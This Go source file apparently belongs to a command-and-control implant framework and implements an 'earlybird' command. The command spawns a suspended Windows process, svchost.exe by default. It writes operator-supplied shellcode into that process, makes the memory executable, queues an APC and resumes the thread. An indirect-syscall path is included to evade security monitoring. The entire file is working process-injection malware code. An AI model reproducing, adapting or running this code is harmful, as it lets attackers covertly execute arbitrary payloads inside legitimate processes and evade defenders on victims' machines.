//go:build windows
// +build windows

package commands

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"runtime"
	"strings"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"

	"killa/pkg/structs"
)

// EarlyBirdCommand implements the earlybird command
type EarlyBirdCommand struct{}

// Name returns the command name
func (c *EarlyBirdCommand) Name() string {
	return "earlybird"
}

// Description returns the command description
func (c *EarlyBirdCommand) Description() string {
	return "Inject shellcode via Early Bird technique (CREATE_SUSPENDEDEB -> APC -> ResumeThread)"
}

// EarlyBirdParams represents the parameters for earlybird
type EarlyBirdParams struct {
	ShellcodeB64 string `json:"shellcode_b64"` // Base64-encoded shellcode bytes
	ProcessName  string `json:"process_name"`  // Process to spawn
}

// Execute executes the earlybird command
func (c *EarlyBirdCommand) Execute(task structs.Task) structs.CommandResult {
	if runtime.GOOS != "windows" {
		return errorResult("Error: This command is only supported on Windows")
	}

	var params EarlyBirdParams
	err := json.Unmarshal([]byte(task.Params), &params)
	if err != nil {
		return errorf("Error parsing parameters: %v", err)
	}

	if params.ShellcodeB64 == "" {
		return errorResult("Error: No shellcode data provided")
	}

	if params.ProcessName == "" {
		params.ProcessName = "C:\\Windows\\System32\\svchost.exe"
	}

	shellcode, err := base64.StdEncoding.DecodeString(params.ShellcodeB64)
	if err != nil {
		return errorf("Error decoding shellcode: %v", err)
	}

	if len(shellcode) == 0 {
		return errorResult("Error: Shellcode data is empty")
	}

	output, err := performEarlyBird(shellcode, params.ProcessName)
	if err != nil {
		return errorResult(output + fmt.Sprintf("\n[!] Early Bird Injection failed: %v", err))
	}

	return successResult(output)
}

func performEarlyBird(shellcode []byte, processName string) (string, error) {
	var sb strings.Builder

	sb.WriteString("[*] Early Bird Injection starting\n")
	sb.WriteString(fmt.Sprintf("[*] Shellcode size: %d bytes\n", len(shellcode)))
	sb.WriteString(fmt.Sprintf("[*] Spawning target process: %s\n", processName))

	// Step 1: CreateProcessW in CREATE_SUSPENDEDEB state
	commandLine, err := syscall.UTF16PtrFromString(processName)
	if err != nil {
		return sb.String(), fmt.Errorf("Error converting path: %v", err)
	}

	var startupInfo STARTUPINFOEB
	startupInfo.Cb = uint32(unsafe.Sizeof(startupInfo))

	var processInfo PROCESS_INFORMATIONEB

	creationFlags := uint32(CREATE_SUSPENDEDEB)

	ret, _, err := procCreateProcessWEB.Call(
		0,
		uintptr(unsafe.Pointer(commandLine)),
		0,
		0,
		0,
		uintptr(creationFlags),
		0,
		0,
		uintptr(unsafe.Pointer(&startupInfo)),
		uintptr(unsafe.Pointer(&processInfo)),
	)

	if ret == 0 {
		return sb.String(), fmt.Errorf("CreateProcess failed: %v", err)
	}
	defer injectCloseHandle(uintptr(processInfo.Process))
	defer injectCloseHandle(uintptr(processInfo.Thread))

	sb.WriteString(fmt.Sprintf("[+] Process %d created in SUSPENDED state\n", processInfo.ProcessId))
	sb.WriteString(fmt.Sprintf("[+] Main Thread ID: %d\n", processInfo.ThreadId))

	hProcess := uintptr(processInfo.Process)
	hThread := uintptr(processInfo.Thread)

	if IndirectSyscallsAvailable() {
		sb.WriteString("[*] Using indirect syscalls (Nt* via stubs) for injection\n")
		return earlyBirdIndirect(&sb, shellcode, hProcess, hThread)
	}

	return earlyBirdStandard(&sb, shellcode, hProcess, hThread)
}

func earlyBirdIndirect(sb *strings.Builder, shellcode []byte, hProcess, hThread uintptr) (string, error) {
	// Step 2: NtAllocateVirtualMemory (RW)
	var remoteAddr uintptr
	regionSize := uintptr(len(shellcode))
	status := IndirectNtAllocateVirtualMemory(hProcess, &remoteAddr, &regionSize,
		MEM_COMMITEB|MEM_RESERVEEB, PAGE_READWRITEEB)
	if status != 0 {
		return sb.String(), fmt.Errorf("memory allocation failed: NTSTATUS 0x%X", status)
	}
	sb.WriteString(fmt.Sprintf("[+] Allocated: 0x%X (RW)\n", remoteAddr))

	// Step 3: Write shellcode
	var bytesWritten uintptr
	status = IndirectNtWriteVirtualMemory(hProcess, remoteAddr,
		uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), &bytesWritten)
	if status != 0 {
		return sb.String(), fmt.Errorf("memory write failed: NTSTATUS 0x%X", status)
	}
	sb.WriteString(fmt.Sprintf("[+] Wrote: %d bytes\n", bytesWritten))

	// Step 4: Change protection (RW → RX)
	protectAddr := remoteAddr
	protectSize := uintptr(len(shellcode))
	var oldProtect uint32
	status = IndirectNtProtectVirtualMemory(hProcess, &protectAddr, &protectSize,
		PAGE_EXECUTE_READEB, &oldProtect)
	if status != 0 {
		return sb.String(), fmt.Errorf("memory protection change failed: NTSTATUS 0x%X", status)
	}
	sb.WriteString("[+] Protection: RW → RX\n")

	// Step 5: Queue APC
	status = IndirectNtQueueApcThread(hThread, remoteAddr, 0, 0, 0)
	if status != 0 {
		return sb.String(), fmt.Errorf("APC queue failed: NTSTATUS 0x%X", status)
	}
	sb.WriteString("[+] APC queued on main thread\n")

	// Step 6: ResumeThread
	var prevCount uint32
	status = IndirectNtResumeThread(hThread, &prevCount)
	if status != 0 {
		return sb.String(), fmt.Errorf("thread resume failed: NTSTATUS 0x%X", status)
	}
	sb.WriteString(fmt.Sprintf("[+] Thread resumed (previous suspend count: %d)\n", prevCount))

	sb.WriteString("[+] Early Bird injection completed successfully\n")
	return sb.String(), nil
}

func earlyBirdStandard(sb *strings.Builder, shellcode []byte, hProcess, hThread uintptr) (string, error) {
	// Step 2: Allocate RW memory
	remoteAddr, _, err := procVirtualAllocExEB.Call(
		hProcess, 0, uintptr(len(shellcode)),
		uintptr(MEM_COMMITEB|MEM_RESERVEEB), uintptr(PAGE_READWRITEEB))
	if remoteAddr == 0 {
		// we should terminate the process if allocation failed
		procTerminateProcessEB.Call(hProcess, 1)
		return sb.String(), fmt.Errorf("memory allocation failed: %v", err)
	}
	sb.WriteString(fmt.Sprintf("[+] Allocated RW memory at: 0x%X\n", remoteAddr))

	// Step 3: Write shellcode
	var bytesWritten uintptr
	ret, _, err := procWriteProcessMemoryEB.Call(
		hProcess, remoteAddr, uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)), uintptr(unsafe.Pointer(&bytesWritten)))
	if ret == 0 {
		procTerminateProcessEB.Call(hProcess, 1)
		return sb.String(), fmt.Errorf("memory write failed: %v", err)
	}
	sb.WriteString(fmt.Sprintf("[+] Wrote %d bytes to remote memory\n", bytesWritten))

	// Step 4: Change to RX
	var oldProtect uint32
	ret, _, err = procVirtualProtectXEB.Call(
		hProcess, remoteAddr, uintptr(len(shellcode)),
		uintptr(PAGE_EXECUTE_READEB), uintptr(unsafe.Pointer(&oldProtect)))
	if ret == 0 {
		procTerminateProcessEB.Call(hProcess, 1)
		return sb.String(), fmt.Errorf("memory protection change failed: %v", err)
	}
	sb.WriteString("[+] Changed memory protection to RX\n")

	// Step 5: Queue APC
	ret, _, err = procQueueUserAPCEB.Call(remoteAddr, hThread, 0)
	if ret == 0 {
		procTerminateProcessEB.Call(hProcess, 1)
		return sb.String(), fmt.Errorf("APC queue failed: %v", err)
	}
	sb.WriteString("[+] APC queued successfully\n")

	// Step 6: ResumeThread
	prevCount, _, _ := procResumeThreadEB.Call(hThread)
	if int32(prevCount) == -1 {
		procTerminateProcessEB.Call(hProcess, 1)
		return sb.String(), fmt.Errorf("thread resume failed")
	}
	sb.WriteString(fmt.Sprintf("[+] Thread resumed (previous suspend count: %d)\n", prevCount))

	sb.WriteString("[+] Early Bird injection completed successfully\n")
	return sb.String(), nil
}

// Make sure procTerminateProcessEB is available
var procTerminateProcessEB = windows.NewLazySystemDLL("kernel32.dll").NewProc("TerminateProcess")

var (
	procVirtualProtectXEB = windows.NewLazySystemDLL("kernel32.dll").NewProc("VirtualProtectEx")
	procQueueUserAPCEB = windows.NewLazySystemDLL("kernel32.dll").NewProc("QueueUserAPC")
	procResumeThreadEB = windows.NewLazySystemDLL("kernel32.dll").NewProc("ResumeThread")
)
var procCreateProcessWEB = windows.NewLazySystemDLL("kernel32.dll").NewProc("CreateProcessW")

const CREATE_SUSPENDEDEB = 0x00000004

type STARTUPINFOEB struct {
	Cb            uint32
	Reserved      *uint16
	Desktop       *uint16
	Title         *uint16
	X             uint32
	Y             uint32
	XSize         uint32
	YSize         uint32
	XCountChars   uint32
	YCountChars   uint32
	FillAttribute uint32
	Flags         uint32
	ShowWindow    uint16
	CbReserved2   uint16
	Reserved2     *byte
	StdInput      windows.Handle
	StdOutput     windows.Handle
	StdError      windows.Handle
}

type PROCESS_INFORMATIONEB struct {
	Process   windows.Handle
	Thread    windows.Handle
	ProcessId uint32
	ThreadId  uint32
}

const (
	PAGE_NOACCESSEB          = 0x01
	PAGE_READONLYEB          = 0x02
	PAGE_READWRITEEB         = 0x04
	PAGE_EXECUTE_READEB      = 0x20
	MEM_COMMITEB             = 0x1000
	MEM_RESERVEEB            = 0x2000
)

var (
	procVirtualAllocExEB = windows.NewLazySystemDLL("kernel32.dll").NewProc("VirtualAllocEx")
	procWriteProcessMemoryEB = windows.NewLazySystemDLL("kernel32.dll").NewProc("WriteProcessMemory")
)
